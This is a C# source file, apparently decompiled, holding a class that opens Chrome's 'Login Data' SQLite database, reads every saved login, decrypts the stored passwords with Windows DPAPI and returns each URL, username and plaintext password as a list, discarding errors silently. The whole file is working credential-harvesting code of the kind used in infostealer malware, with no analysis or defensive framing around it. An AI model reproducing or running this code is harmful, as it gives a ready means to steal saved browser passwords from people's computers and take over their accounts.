using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using MainModule.Classes;

namespace Decrypt
{
	// Token: 0x0200003B RID: 59
	public class Chrome : IPasswordDecrypter
	{
		// Token: 0x0600013F RID: 319 RVA: 0x00007744 File Offset: 0x00005944
		public Chrome(string _loginData)
		{
			bool flag = string.IsNullOrWhiteSpace(_loginData);
			if (flag)
			{
				throw new ArgumentNullException("_loginData");
			}
			bool flag2 = !File.Exists(_loginData);
			if (flag2)
			{
				throw new ArgumentException(string.Format("File \"{0}\" not found", _loginData));
			}
			this.LoginData = _loginData;
		}

		// Token: 0x06000140 RID: 320 RVA: 0x00007794 File Offset: 0x00005994
		public List<Log> GetPasswords()
		{
			List<Log> result;
			try
			{
				List<Log> list = new List<Log>();
				string text = string.Format("Data Source = {0}", this.LoginData);
				string arg = "logins";
				byte[] entropyBytes = null;
				DataTable dataTable = new DataTable();
				string text2 = string.Format("SELECT * FROM {0}", arg);
				using (SQLiteConnection sqliteConnection = new SQLiteConnection(text))
				{
					SQLiteCommand sqliteCommand = new SQLiteCommand(text2, sqliteConnection);
					SQLiteDataAdapter sqliteDataAdapter = new SQLiteDataAdapter(sqliteCommand);
					sqliteDataAdapter.Fill(dataTable);
				}
				for (int i = 0; i < dataTable.Rows.Count; i++)
				{
					string text3 = dataTable.Rows[i][1].ToString();
					string text4 = dataTable.Rows[i][3].ToString();
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string text5;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out text5);
					string text6 = new UTF8Encoding(true).GetString(bytes);
					text4 = Regex.Replace(text4, "[^\\u0020-\\u007F]", string.Empty);
					text6 = Regex.Replace(text6, "[^\\u0020-\\u007F]", string.Empty);
					text3 = Regex.Replace(text3, "[^\\u0020-\\u007F]", string.Empty);
					Log log = new Log
					{
						URL = (string.IsNullOrWhiteSpace(text3) ? "UNKOWN" : text3),
						Login = (string.IsNullOrWhiteSpace(text4) ? "UNKOWN" : text4),
						Password = (string.IsNullOrWhiteSpace(text6) ? "UNKOWN" : text6)
					};
					bool flag = log.Login != "UNKOWN" && log.Password != "UNKOWN" && log.URL != "UNKOWN";
					if (flag)
					{
						list.Add(log);
					}
				}
				result = list;
			}
			catch
			{
				result = new List<Log>();
			}
			return result;
		}

		// Token: 0x040000AF RID: 175
		private string LoginData;
	}
}
